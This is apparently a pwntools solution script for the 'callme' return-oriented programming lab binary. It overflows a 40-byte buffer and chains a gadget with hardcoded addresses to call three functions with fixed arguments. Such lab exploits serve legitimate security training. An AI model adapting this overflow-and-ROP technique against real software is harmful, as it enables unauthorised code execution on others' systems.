from pwn import *
p = process("./callme")

i = 0
while i < 4:
    print(p.recvline())
    i = i + 1

callme1 = p64(0x401850)
callme2 = p64(0x401870)
callme3 = p64(0x401810)

offset = "\x41" * 40

usefulGadgets = p64(0x401ab0)
one = p64(0x1)
two = p64(0x2)
three = p64(0x3)

rop = offset + usefulGadgets + one + two + three + callme1 + usefulGadgets + one + two + three + callme2 + usefulGadgets + one + two + three + callme3 

p.sendline(rop)
print p.recvall()
